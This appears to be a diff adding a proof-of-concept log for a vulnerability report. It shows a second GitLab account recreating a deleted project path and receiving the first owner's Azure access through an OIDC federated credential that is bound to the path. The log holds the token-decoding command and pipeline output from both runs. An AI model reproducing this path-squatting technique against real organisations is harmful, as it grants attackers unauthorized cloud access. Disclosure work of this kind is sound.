@@ -1,0 +1,54 @@
+============================================================
+CROSS-USER PROOF: Two different GitLab users, same Azure access
+============================================================
+Account 1: ACD421 (victim/original owner)
+Account 2: anastasia061694-creator (attacker/squatter)
+Group: oidc-poc-grp (id=132381178)
+Project: oidc-poc-grp/cross-user-37101
+
+Azure federated credential subject: project_path:oidc-poc-grp/cross-user-37101:ref_type:branch:ref:main
+
+=== PHASE 1: ACCOUNT 1 (ACD421) CREATES PROJECT ===
+Created by ACD421: pid=82320470 path=oidc-poc-grp/cross-user-37101
+CI pushed by Account 1
+Waiting for pipeline...
+  pipeline=2535351224 status=running
+  pipeline=2535351224 status=success
+Pipeline: success
+2026-05-18T20:45:29.158035Z 01O [32;1m$ python3 -c "import base64,json,os;t=os.environ['OIDC_TOKEN'];p=t.split('.')[1]+'=='*3;c=json.loads(base64.urlsafe_b64decode(p));print(json.dumps(c,indent=2));p
+2026-05-18T20:45:29.236562Z 01O sub=project_path:oidc-poc-grp/cross-user-37101:ref_type:branch:ref:main
+2026-05-18T20:45:29.236562Z 01O project_id=82320470
+2026-05-18T20:45:29.236563Z 01O user_login=ACD421
+2026-05-18T20:45:29.236564Z 01O user_id=38265396
+2026-05-18T20:45:30.253350Z 01O SUCCESS - Azure token: 1899 chars
+2026-05-18T20:45:30.253356Z 01O       "id": "/subscriptions/f8a85b5e-830d-4646-9f50-64c167ca17c4/resourceGroups/oidc-poc-rg",
+2026-05-18T20:45:30.253357Z 01O       "name": "oidc-poc-rg",
+
+=== PHASE 2: DELETE + ACCOUNT 2 (anastasia061694-creator) SQUATS ===
+Path check: 404
+Created by anastasia061694-creator: pid=82320505 path=oidc-poc-grp/cross-user-37101
+DIFFERENT user, DIFFERENT project_id (82320470 vs 82320505), SAME path
+CI pushed by Account 2
+Waiting for pipeline...
+  pipeline=2535352594 status=running
+  pipeline=2535352594 status=success
+Pipeline: success
+2026-05-18T20:46:31.554597Z 01O [32;1m$ python3 -c "import base64,json,os;t=os.environ['OIDC_TOKEN'];p=t.split('.')[1]+'=='*3;c=json.loads(base64.urlsafe_b64decode(p));print(json.dumps(c,indent=2));p
+2026-05-18T20:46:31.634497Z 01O sub=project_path:oidc-poc-grp/cross-user-37101:ref_type:branch:ref:main
+2026-05-18T20:46:31.634498Z 01O project_id=82320505
+2026-05-18T20:46:31.634499Z 01O user_login=anastasia061694-creator
+2026-05-18T20:46:31.634499Z 01O user_id=38345911
+2026-05-18T20:46:32.566698Z 01O SUCCESS - Azure token: 1900 chars
+2026-05-18T20:46:32.566703Z 01O       "id": "/subscriptions/f8a85b5e-830d-4646-9f50-64c167ca17c4/resourceGroups/oidc-poc-rg",
+2026-05-18T20:46:32.566704Z 01O       "name": "oidc-poc-rg",
+
+============================================================
+CROSS-USER PROOF
+============================================================
+Account 1 (ACD421): pid=82320470
+Account 2 (anastasia061694-creator): pid=82320505
+Same path: oidc-poc-grp/cross-user-37101
+Different users: ACD421 vs anastasia061694-creator
+Different project_ids: 82320470 vs 82320505
+AZURE TOKEN: Account 2 OBTAINED victim's Azure access
+Cleaned up
